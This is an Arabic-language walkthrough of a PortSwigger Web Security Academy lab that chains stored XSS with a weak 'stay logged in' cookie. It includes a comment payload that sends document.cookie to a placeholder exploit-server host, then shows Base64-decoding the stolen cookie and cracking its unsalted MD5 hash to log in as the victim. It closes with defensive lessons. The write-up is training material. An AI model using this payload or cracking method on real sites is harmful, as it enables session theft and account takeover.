# Lab : Offline password cracking

http://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking

- الفكره من الLab ده ان الموقع بيحط الpassword في ال cookie فا ممكن نسرقها و الcomment في ثغره stored XSS فا دي الطريقه

```bash
1. <script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

### الفكرة العامة (نوع الثغرة)

اللاب ده بيجمع بين ثغرتين مع بعض:

1. **Stored XSS** في خانة التعليقات — بتُستخدم كوسيلة لسرقة كوكي الضحية.
2. **تصميم ضعيف لكوكي "Stay logged in"** (نفس الفكرة اللي شرحناها في لاب "Brute-forcing a stay-logged-in cookie") — الكوكي بيحتوي على **MD5 hash للباسورد بشكل خام**، وده بيسمح بعمل **Offline password cracking** (يعني تكسير الهاش من غير ما تحتاج تبعت أي محاولات لسيرفر الموقع نفسه — تقدر تدور على الهاش في أدوات cracking أو حتى في محرك بحث).

### خطوات الحل بالتفصيل

#### 1. افهم بنية الكوكي بحسابك انت

سجل دخول بـ `wiener:peter` مع اختيار **"Stay logged in"**. افحص الـ response بتاع الـ login request في **Proxy > HTTP history**، هتلاقي الكوكي `stay-logged-in` بعد فك الـ Base64 شكله:

```
username:md5HashOfPassword
```

#### 2. لاقي مكان الـ Stored XSS

دوّر في الموقع على مكان بيقبل تعليقات (comments) على أي بوست/بلوج، وجرب فيه payload بسيط زي `<script>alert(1)</script>` للتأكد إن الثغرة موجودة (بيتخزن التعليق وينفذ عند أي حد يفتح الصفحة).

#### 3. جهّز الـ Exploit Server

مش هتحتاجه فعليًا هنا (لأن الهدف بس تسرق كوكي، مش تعمل redirect)، لكن الطريقة الرسمية بتستخدمه كمكان لاستقبال الكوكي المسروق:

- روح لـ **Go to exploit server**، وسجّل الـ **URL** بتاعه (شكله: `https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net`).

#### 4. اكتب تعليق فيه الـ XSS Payload

روح لأي بوست في المدونة، واكتب تعليق فيه:

html

```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

غيّر `YOUR-EXPLOIT-SERVER-ID` بالـ ID الحقيقي بتاعك. الكود ده لما ينفذ في متصفح أي حد بيزور الصفحة، هيحوّل متصفحه لسيرفرك ويبعتله كل الكوكيز بتاعته كـ query string في الـ URL.

انشر التعليق.

#### 5. استنى الضحية (carlos) يزور الصفحة

في اللاب، فيه "victim" (زي admin bot) بيزور الصفحات بشكل دوري تلقائيًا. لما `carlos` يفتح الصفحة اللي فيها تعليقك، السكريبت هيتنفذ في متصفحه، وهيبعت الكوكي بتاعه لسيرفرك.

#### 6. افحص الـ Access Log بتاع الـ Exploit Server

روح لـ **exploit server > View exploit server > Access log**، هتلاقي **GET request** جاي من الضحية، فيه الكوكيز بتاعته كـ query string، من ضمنها `stay-logged-in`.

#### 7. فك تشفير الكوكي (Base64 Decode)

انسخ قيمة `stay-logged-in`، وحطها في **Burp Decoder** واعمل **Decode as → Base64**. الناتج:

```
carlos:26323c16d5f4dabff3bb136f2460a943
```

يبقى عرفنا:

- الـ username: `carlos` (مؤكد).
- الـ MD5 hash بتاع باسورده: `26323c16d5f4dabff3bb136f2460a943`.

#### 8. كسّر الهاش (Offline Cracking)

بما إن الهاش ده MD5 عادي (بدون salt)، وممكن يكون باسورد شائع، أسهل طريقة هي:

- تدور عليه في محرك بحث مباشرة (زي Google) — هاشات MD5 لباسوردات شائعة غالبًا موجودة في **rainbow tables** عامة على الإنترنت.
- أو تستخدم أداة **Hashcat** أو موقع زي **CrackStation** وتحط فيه الهاش.

الهاش ده بالتحديد بيطابق كلمة السر:

```
onceuponatime
```

#### 9. سجل دخول بحساب carlos واحذف الحساب

```
username: carlos
password: onceuponatime
```

روح لصفحة **"My account"**، واحذف حسابه من زرار الحذف الموجود فيها.

اللاب هيتحل تلقائيًا ✅.

### ليه ده بيحصل تقنيًا

المشكلة مركّبة من عدة نقاط ضعف مع بعض:

1. **Stored XSS** بيسمح بتنفيذ كود عشوائي في متصفح أي مستخدم تاني (بما فيهم الضحية المستهدفة).
2. **الكوكي بيحتوي على الـ password hash مباشرة (`md5(password)`) بشكل خام**، بدل token عشوائي غير مرتبط بالباسورد.
3. **استخدام MD5** (خوارزمية سريعة الحساب ومش مصممة للأمان) بيخلي أي هاش مسروق **سهل الكسر offline** — إما بمطابقته مع rainbow tables جاهزة، أو بعمل brute-force سريع جدًا محليًا من غير حتى ما تحتاج تتواصل مع السيرفر خالص.

### الدرس المستفاد

- **أي معلومة حساسة بتتسرب لمتصفح المستخدم (حتى لو "مشفرة" بشكل بسيط زي hash)، لازم تتعامل معاها كأنها مكشوفة بالكامل**، لأن أي hash بسيط (خصوصًا MD5/SHA1 بدون salt) قابل للكسر بسرعة كبيرة جدًا بأدوات عادية أو حتى بحث مباشر.
- **الكوكيز الخاصة بـ "stay logged in" لازم تكون tokens عشوائية بحتة**، مش نتيجة مباشرة لدالة حسابية بسيطة على بيانات المستخدم (زي `md5(password)`).
- **XSS مش بس بيعمل "alert box"** — أي ثغرة XSS ناجحة (حتى لو شكلها بسيط) بتديك القدرة الكاملة على **قراءة أي حاجة موجودة في `document.cookie`** بتاعة أي مستخدم بيزور الصفحة، وده بيفتح الباب لسرقة session كاملة أو بيانات حساسة زي هنا.
- **دايمًا افحص إمكانية دمج ثغرتين مع بعض** (XSS + ضعف تصميم كوكي) — ده نمط شائع جدًا في اختبارات الاختراق الحقيقية، مش كل ثغرة لازم تُستغل لوحدها.
